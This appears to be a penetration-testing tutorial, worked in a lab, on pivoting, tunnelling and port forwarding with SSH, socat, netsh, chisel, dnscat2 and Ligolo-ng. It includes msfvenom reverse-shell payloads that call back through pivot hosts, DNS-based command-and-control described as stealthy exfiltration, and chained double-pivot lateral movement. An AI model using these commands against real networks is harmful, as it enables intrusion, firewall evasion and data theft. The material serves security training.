# Pivoting, Tunnelling and Port Forwarding



* **Pivoting:** Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network.
* **Tunneling:** Tunneling encapsulates network traffic into another protocol and routes traffic through it.
* **Lateral Movement:** Lateral movement can be described as a technique used to further access to our additional `hosts`, `applications` and `services`.&#x20;
* **Port Forwarding:** Port forwarding is a technique that allows us to redirect a communication request from one port to another.&#x20;

## Types of Port Forwarding

### 1. Local Port Forwarding (`-L`)

**Purpose:** Access a **remote/internal service** from **your own machine**.

**Flow:**

```
Your PC ---> SSH Server ---> Internal Service
```

Example:

```
ssh -L 8080:192.168.1.10:80 user@jump-server
```

Now when you open:

```
http://localhost:8080
```

it actually connects to:

```
192.168.1.10:80
```

through the SSH tunnel.

**Use in Pentesting**

* Access internal web applications.
* Access internal databases.
* Access RDP/SSH services hidden behind a jump host.

### 2. Dynamic Port Forwarding (`-D`)

**Purpose:** Create a **SOCKS proxy** so **any application** can access the remote network.

**Flow:**

```
Browser/Proxychains
        │
        ▼
localhost:1080 (SOCKS Proxy)
        │
        ▼
SSH Server
        │
        ▼
Any Internal Host
```

Example:

```
ssh -D 1080 user@jump-server
```

Now configure your browser or Proxychains to use:

```
127.0.0.1:1080
```

Every connection is routed through the SSH server.

**Use in Pentesting**

* Browse internal websites.
* Run tools like `proxychains nmap`.
* Reach multiple internal machines without creating many tunnels.

### 3. Remote Port Forwarding (`-R`)

**Purpose:** Allow the **remote server** to access a service running on **your local machine**.

**Flow:**

```
Remote Server ---> SSH Tunnel ---> Your PC
```

Example:

```
ssh -R 8080:localhost:80 user@server
```

Now someone on the server can access:

```
localhost:8080
```

and it actually reaches

```
your-PC:80
```

**Use in Pentesting**

* Expose a local web server to a compromised machine.
* Receive reverse shells when the target cannot directly reach your machine.
* Share local tools/files with the remote host.

### Quick Memory Trick

<table><thead><tr><th width="142.60003662109375">Type</th><th width="170">Direction</th><th>Who accesses what?</th></tr></thead><tbody><tr><td><strong>Local (-L)</strong></td><td>Remote → Local</td><td><strong>You</strong> access a remote/internal service.</td></tr><tr><td><strong>Dynamic (-D)</strong></td><td>Remote → Local</td><td><strong>You</strong> get a SOCKS proxy to access many remote services.</td></tr><tr><td><strong>Remote (-R)</strong></td><td>Local → Remote</td><td><strong>The remote host</strong> accesses a service running on your machine.</td></tr></tbody></table>

#### One-line summary

* **Local (`-L`)** → _I want to reach their service._
* **Dynamic (`-D`)** → _I want a proxy into their network._
* **Remote (`-R`)** → _They need to reach my service._

## Local Port Forwarding&#x20;

### Local Destination&#x20;

<figure><img src="../.gitbook/assets/image (1755).png" alt=""><figcaption></figcaption></figure>

### Remote Destination&#x20;

<figure><img src="../.gitbook/assets/image (1763).png" alt=""><figcaption></figcaption></figure>

### Using SSH (Local Port)

#### Before Port Forwarding&#x20;

<figure><img src="../.gitbook/assets/image (1756).png" alt=""><figcaption></figcaption></figure>

#### After Port Forwarding

{% code overflow="wrap" %}
```bash
ssh -L 8080:localhost:80 r0b@192.168.52.131
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1757).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**Multiple Port Forwarding:**&#x20;

_You can forward multiple ports using below command._&#x20;

{% code overflow="wrap" %}
```bash
ssh -L <local port>:<compromised host ip>:<remote port> -L <....> <username>@<IP>
```
{% endcode %}
{% endhint %}

### Using SSH (Remote Port)

{% code overflow="wrap" %}
```bash
ssh -L 3389:192.168.16.111:3389 r0b@192.168.52.131
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1762).png" alt=""><figcaption></figcaption></figure>

### Using socat&#x20;

_We've to run this tool from the compromised host/pivot._&#x20;

{% code overflow="wrap" %}
```bash
socat TCP4-LISTEN:<attacker port>,fork TCP4:<remote host>:<remote host port>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1788).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Intermediate Process</strong></summary>

<figure><img src="../.gitbook/assets/image (1789).png" alt=""><figcaption></figcaption></figure>

</details>

<figure><img src="../.gitbook/assets/image (1790).png" alt=""><figcaption></figcaption></figure>

### Using Netsh&#x20;

#### Scenario

<figure><img src="../.gitbook/assets/image (1798).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```cmd
netsh.exe interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.52.132 connectport=22 connectaddress=192.168.16.142
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1796).png" alt=""><figcaption></figcaption></figure>

#### Using it&#x20;

<figure><img src="../.gitbook/assets/image (1797).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
_Be patient. Good things take time._&#x20;
{% endhint %}

## Dynamic Port Forwarding&#x20;

<figure><img src="../.gitbook/assets/image (1759).png" alt=""><figcaption></figcaption></figure>

### Using SSH Tunneling over SOCKS (Linux)

#### Creating Tunnel

{% code overflow="wrap" %}
```bash
ssh -D <local port> rob@192.168.52.131
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1758).png" alt=""><figcaption></figcaption></figure>

#### Using Tunnel&#x20;

<figure><img src="../.gitbook/assets/image (1760).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (1761).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
**⚠️ Warning**

&#x20;_Nmap scans through SSH Dynamic Port Forwarding (SOCKS/Proxychains) can be unreliable; perform port scanning from the compromised pivot host itself, then use Dynamic Port Forwarding to access the discovered services locally._
{% endhint %}

### Using SSH tunneling over Proxifier (Windows)

#### Creating tunnel&#x20;

{% code overflow="wrap" %}
```cmd
plink -ssh -D 9050 r0b@192.168.16.142
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1791).png" alt=""><figcaption></figcaption></figure>

#### Setup SOCKS proxy&#x20;

_Install Proxifier Tool and add Proxy server from the Profile tab._&#x20;

<figure><img src="../.gitbook/assets/image (1792).png" alt=""><figcaption></figcaption></figure>

#### Using Tunnel&#x20;

<figure><img src="../.gitbook/assets/image (1793).png" alt=""><figcaption></figcaption></figure>

### Using chisel&#x20;

**Start server on pivot host:**&#x20;

{% code overflow="wrap" %}
```bash
./chisel server -v -p 1234 --socks5
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1802).png" alt=""><figcaption></figcaption></figure>

**Start client on attack box:**&#x20;

{% code overflow="wrap" %}
```bash
./chisel client -v 192.168.52.131:1234 socks
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1803).png" alt=""><figcaption></figcaption></figure>

you can see it opens up a SOCKS proxy port on `1080`. Make sure you've configured proxychains to use it.&#x20;

#### Using the tunnel&#x20;

<figure><img src="../.gitbook/assets/image (1801).png" alt=""><figcaption></figcaption></figure>

### Using chisel (Reverse Pivot)&#x20;

{% hint style="info" %}
_This is same as the last one. only thing is if firewall rules restrict inbound connections in pivot host to our compromised target we can use this option._&#x20;
{% endhint %}

**Start server on attack box:**&#x20;

{% code overflow="wrap" %}
```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1804).png" alt=""><figcaption></figcaption></figure>

**Start client on pivot host:**

{% code overflow="wrap" %}
```bash
./chisel client -v 192.168.52.130:1234 R:socks
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1805).png" alt=""><figcaption></figcaption></figure>

#### Using the tunnel&#x20;

<figure><img src="../.gitbook/assets/image (1806).png" alt=""><figcaption></figcaption></figure>

## Remote Port Forwarding&#x20;

<figure><img src="../.gitbook/assets/image (1768).png" alt=""><figcaption></figcaption></figure>

### Using SSH&#x20;

{% code overflow="wrap" %}
```bash
ssh -R <Internal IP>:<local port of internal IP>:<attacker's listener>:<port> ubuntu@<target>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1765).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Intermediate Process</strong></summary>

We've created metasploit payload that will connect to `192.168.16.142:5080` which in turns connect to our local port `4444`.&#x20;

<figure><img src="../.gitbook/assets/image (1766).png" alt=""><figcaption></figcaption></figure>

</details>

<figure><img src="../.gitbook/assets/image (1767).png" alt=""><figcaption></figcaption></figure>

### Using Socat&#x20;

_We've to run this tool from the compromised host/pivot._&#x20;

{% code overflow="wrap" %}
```bash
socat TCP4-LISTEN:<local port>,fork TCP4:<attacker host>:<attacker port>
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1785).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Intermediate Process</strong></summary>

<figure><img src="../.gitbook/assets/image (1786).png" alt=""><figcaption></figcaption></figure>

</details>

<figure><img src="../.gitbook/assets/image (1787).png" alt=""><figcaption></figcaption></figure>

## Meterpreter Tunneling and Port Forwarding&#x20;

[Go To Metasploit Framework](tools/metasploit-framework.md#maintaining-persistence)

## Tunneling&#x20;

### Using dnscat2

**dnscat2** is a popular penetration testing and command-and-control (C2) tool designed to create an encrypted tunnel over the DNS (Domain Name System) protocol. Dnscat2 can be an extremely stealthy approach to exfiltrate data while evading firewall detections which strip the HTTPS connections and sniff the traffic.

#### Attack Host&#x20;

{% code overflow="wrap" %}
```bash
sudo ruby dnscat2.rb --dns host=192.168.52.130,port=53,domain=nexploit.local --no-cache
```
{% endcode %}

_you can see in the image that traffic is encrypted within DNS._&#x20;

<figure><img src="../.gitbook/assets/image (1799).png" alt=""><figcaption></figcaption></figure>

#### Client&#x20;

{% code overflow="wrap" %}
```powershell
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1800).png" alt=""><figcaption></figcaption></figure>

## Ligolo-ng&#x20;

Ligolo-ng builds a tunnel and connects it to a **virtual network card (a TUN interface)** on your Kali machine. Once you add a route to that virtual card, Kali _believes_ it's physically plugged into the target's internal network. No proxy wrapper, no proxychains.conf, nmap just works.

**Components**&#x20;

* **Proxy (server)** — runs on your Kali attack box.
* **Agent** — a small binary you run on the machine you've compromised (Ubuntu, in your case).

{% hint style="info" %}
_On the agent side, no admin/root access is required at all — everything can be performed without administrative access. However, on the relay/proxy server (your Kali box), you do need to be able to create a tun interface_
{% endhint %}

### Ligolo-ng Setup&#x20;

<figure><img src="../.gitbook/assets/ChatGPT Image Aug 20, 2026, 06_51_00 PM.png" alt=""><figcaption></figcaption></figure>

### Starting the Ligolo-Ng proxy&#x20;

On Kali, we started the proxy using self-signed certificates:

{% code overflow="wrap" expandable="true" %}
```bash
sudo ligolo-proxy --selfcert
```
{% endcode %}

The first run generated the configuration file and enabled the Web UI (not implemented officially)

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 111353.png" alt=""><figcaption></figcaption></figure>

### Connecting the Ubuntu Agent&#x20;

{% code overflow="wrap" expandable="true" %}
```bash
./agent -connect <kali ip>:<kali port> -ignore-cert
```
{% endcode %}

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 112019.png" alt=""><figcaption></figcaption></figure>

At this point, the proxy knows about the Ubuntu pivot, but **traffic is not yet being routed through it**.

In Kali we'll get a notification that an Agent has joined us.&#x20;

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 112039.png" alt=""><figcaption></figcaption></figure>

### Connecting to session&#x20;

Select the Ubuntu agent as our session. This changes the terminal context; then check the active tunnels.

{% code overflow="wrap" expandable="true" %}
```bash
session
tunnel_list
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1957).png" alt=""><figcaption></figcaption></figure>

### Starting the first tunnel&#x20;

Start the tunnel to establish a connection to the Ubuntu host.

{% code overflow="wrap" expandable="true" %}
```bash
tunnel_start --tun ligolo
tunnel_list
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1958).png" alt=""><figcaption></figcaption></figure>

We can see that an interface named `ligolo` has been created, which acts as the tunnel to the Ubuntu host.

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 113242.png" alt=""><figcaption></figcaption></figure>

We can also check the interfaces from the Ligolo-ng prompt.&#x20;

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 113358.png" alt=""><figcaption></figcaption></figure>

### Creating first route&#x20;

So far, we have created the tunnel, but traffic will not yet pass through it because Kali does not know that the tunnel can be used to reach the internal network. We therefore need to configure the route.

There are two ways to configure it:

1. **Manual** — covered later
2. **Automatic** — using `autoroute`

Here, we used `autoroute`, selected the required subnet using the arrow keys to navigate and the **Spacebar** to select it, and then created a new interface named `internal1`. **We could also choose to use an existing interface, such as the `ligolo` interface created earlier, instead of creating `internal1`.** This configures the route to the internal network through the selected tunnel/interface.

{% code overflow="wrap" expandable="true" %}
```bash
autoroute
# <arrow keys to navigate>
# <spacebar for selecting>
```
{% endcode %}

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 114110.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 114323.png" alt=""><figcaption></figcaption></figure>

Upon creation, we can see that a new interface named `internal1` appears, which will now route our traffic to the internal network.

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 114350.png" alt=""><figcaption></figcaption></figure>

### Verifying access to the first internal network&#x20;

And now, as shown in the screenshot, `fping` confirms that the `10.10.20.129` machine is alive, and we can connect to it via RDP using the provided credentials.

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 114645.png" alt=""><figcaption></figcaption></figure>

After configuring the route, we can use `route_list` to view the active routing table, as shown in the screenshot.

{% code overflow="wrap" expandable="true" %}
```bash
route_list
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1959).png" alt=""><figcaption></figcaption></figure>

### Ligolo-Ng Listener

After connecting to the RDP session, we attempted to obtain a reverse shell, but the connection failed. The tunnel allows Kali to reach the internal network through the pivot host, but it does not automatically provide a reverse path for the internal host to connect back to Kali. As shown in the screenshot, the `Test-NetConnection` request fails even though the destination port is open.

{% code overflow="wrap" expandable="true" %}
```bash
Test-NetConnection 10.10.10.128 -Port 8081
```
{% endcode %}

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 115710.png" alt=""><figcaption></figcaption></figure>

So, we created a Ligolo-ng listener on the Ubuntu host to listen on port `8082` and forward the traffic it receives to port `8081` on our Kali VM.

{% code overflow="wrap" expandable="true" %}
```bash
listener_add --addr 0.0.0.0:8082 --to 127.0.0.1:8081 --tcp
listener_list
```
{% endcode %}

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 115855.png" alt=""><figcaption></figcaption></figure>

After creating the listener, we generated a reverse shell payload using `msfvenom` that connects to `10.10.20.128` on port `8082`. Since the Ligolo-ng listener on Ubuntu is listening on port `8082`, it receives the connection and forwards it to port `8081` on our Kali VM.

{% code overflow="wrap" expandable="true" %}
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<pivot host IP> LPORT=<pivot host port> -f exe -o rev_shell.exe
```
{% endcode %}

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 121228.png" alt=""><figcaption></figcaption></figure>

Upon executing the executable, we successfully obtained the reverse shell as planned.

<figure><img src="../.gitbook/assets/image (1960).png" alt=""><figcaption></figcaption></figure>

### Turning the Standalone Windows Host into a second pivot&#x20;

Since we now need to gain access to the Windows domain-joined machine, we will use the Windows standalone host as our second pivot. We therefore created another Ligolo-ng listener on Ubuntu that listens on port `4444` and forwards the traffic to port `11601` on our Kali VM, which is the Ligolo-ng listener used to manage agents.

{% code overflow="wrap" expandable="true" %}
```bash
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601 --tcp
listener_list
```
{% endcode %}

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 121636.png" alt=""><figcaption></figcaption></figure>

Now, let’s execute the Ligolo-ng agent on the Windows standalone machine so that it connects to the Ligolo-ng proxy running on our Kali VM.

{% code overflow="wrap" expandable="true" %}
```cmd
.\agent.exe -connect 10.10.20.128:4444 -ignore-cert
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (1961).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 122507.png" alt=""><figcaption></figcaption></figure>

### Creating the second tunnel&#x20;

Now, let’s create another tunnel to the second pivot, which will allow us to access the second internal network.

{% code overflow="wrap" expandable="true" %}
```bash
interface create --name internal2
interface_add_route --name internal2 --route 10.10.30.0/24
tunnel_start --tun internal2
```
{% endcode %}

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 122854.png" alt=""><figcaption></figcaption></figure>

Upon creation, we can see that a new interface named `internal2` appears, which will now route our traffic to the second internal network.

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 122912.png" alt=""><figcaption></figcaption></figure>

### Verifying the Second Route

And now, as shown in the screenshot, `fping` confirms that the `10.10.30.129` machine is alive, and we can connect to it via RDP using the provided credentials.

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 123737.png" alt=""><figcaption></figcaption></figure>

### Reverse Shell from the second internal network&#x20;

To obtain a reverse shell from the second internal network, we again need to create a listener on the Windows standalone machine. The Windows domain-joined machine will send its connection to port `8083` on the Windows standalone host, which will then forward the traffic back to port `8081` on our Kali machine.

{% code overflow="wrap" expandable="true" %}
```bash
listener_add --addr 0.0.0.0:8083 --to 127.0.0.1:8081 --tcp
```
{% endcode %}

<figure><img src="../.gitbook/assets/Screenshot 2026-08-20 124527.png" alt=""><figcaption></figcaption></figure>

#### **Getting the shell**&#x20;

<figure><img src="../.gitbook/assets/image (1962).png" alt=""><figcaption></figcaption></figure>

### Cleanup&#x20;

{% code overflow="wrap" expandable="true" %}
```bash
session
tunnel_list
tunnel_stop
interface_list
interface_delete --name <interface>
route_list
interface_delete_route --name <interface> --route <network>/<mask>
listener_list
listener_remove --id <listener_id>
exit
```
{% endcode %}
